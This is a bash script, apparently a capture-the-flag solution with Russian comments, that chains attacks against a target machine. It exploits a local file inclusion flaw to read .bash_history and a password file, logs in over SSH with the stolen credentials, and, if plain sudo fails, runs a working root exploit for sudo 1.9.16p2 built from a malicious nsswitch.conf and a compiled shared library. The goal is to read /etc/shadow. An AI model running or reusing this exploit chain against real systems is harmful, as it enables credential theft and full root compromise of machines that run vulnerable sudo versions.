#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: $0 <target_ip> <web_target_port> <ssh_target_port>"
    exit 1
fi

TARGET=$1
WEB_PORT=$2
SSH_PORT=$3

echo "[*] Шаг 1: Эксплуатация LFI для чтения .bash_history..."
BASH_HISTORY=$(curl -s "http://${TARGET}:${WEB_PORT}/show?file=.bash_history")

echo "[*] Содержимое .bash_history пользователя davy:"
echo "$BASH_HISTORY"
echo ""

echo "[*] Найдена подсказка о password.txt!"
echo ""

echo "[*] Шаг 2: Читаем password.txt через LFI..."
PASSWORD_FILE=$(curl -s "http://${TARGET}:${WEB_PORT}/show?file=password.txt")

echo "[*] Содержимое password.txt:"
echo "$PASSWORD_FILE"
echo ""

# Извлекаем логин и пароль joey
JOEY_USER=$(echo "$PASSWORD_FILE" | cut -d':' -f1 | tr -d ' \n\r')
JOEY_PASSWORD=$(echo "$PASSWORD_FILE" | cut -d':' -f2 | tr -d ' \n\r')

echo "[*] Найдены учётные данные:"
echo "    Пользователь: $JOEY_USER"
echo "    Пароль: $JOEY_PASSWORD"
echo ""

echo "[*] Шаг 3: Подключаемся по SSH как $JOEY_USER..."

# Пробуем простой sudo cat
SHADOW_CONTENT=$(sshpass -p "$JOEY_PASSWORD" ssh -p ${SSH_PORT} -o StrictHostKeyChecking=no ${JOEY_USER}@${TARGET} 'sudo -n cat /etc/shadow 2>/dev/null')

if [ -z "$SHADOW_CONTENT" ]; then
    echo "[!] Простой sudo не работает. Эксплуатируем уязвимость sudo 1.9.16p2..."
    echo ""
    
    # Захватываем вывод эксплойта
    EXPLOIT_OUTPUT=$(sshpass -p "$JOEY_PASSWORD" ssh -p ${SSH_PORT} -o StrictHostKeyChecking=no -T ${JOEY_USER}@${TARGET} << 'EOFMAIN'
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE} || exit 1

cat > woot1337.c << 'EOFC'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "cat /etc/shadow | grep johny", NULL);
}
EOFC

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc/ 2>/dev/null || true

gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c 2>/dev/null

if [ ! -f "libnss_/woot1337.so.2" ]; then
    echo "[!] Не удалось скомпилировать эксплойт"
    rm -rf ${STAGE}
    exit 1
fi

sudo -R woot woot 2>&1

cd /
rm -rf ${STAGE}
EOFMAIN
)
    
    echo "$EXPLOIT_OUTPUT"
    echo ""
    
    # Извлекаем строку с johny из вывода
    JOHNY_LINE=$(echo "$EXPLOIT_OUTPUT" | grep "^johny:")
    
    if [ -z "$JOHNY_LINE" ]; then
        echo "[!] Не удалось получить данные johny из /etc/shadow"
        exit 1
    fi
    
    echo "[*] Шаг 4: Извлекаем пароль пользователя johny..."
    JOHNY_HASH=$(echo "$JOHNY_LINE" | cut -d':' -f2)
    
    echo "[*] Найден хеш johny: $JOHNY_HASH"
    echo ""
    
    echo "[*] Шаг 5: Декодируем base64..."
    FLAG=$(echo "$JOHNY_HASH" | base64 -d)
    
    echo ""
    echo "========================"
    echo "[+] ФЛАГ: $FLAG"
    echo "========================"
    
else
    echo "[*] Содержимое /etc/shadow получено!"
    echo ""
    
    echo "[*] Шаг 4: Извлекаем пароль пользователя johny..."
    JOHNY_HASH=$(echo "$SHADOW_CONTENT" | grep "^johny:" | cut -d':' -f2)
    
    echo "[*] Найден хеш johny: $JOHNY_HASH"
    echo ""
    
    echo "[*] Шаг 5: Декодируем base64..."
    FLAG=$(echo "$JOHNY_HASH" | base64 -d)
    
    echo ""
    echo "========================"
    echo "[+] ФЛАГ: $FLAG"
    echo "========================"
fi
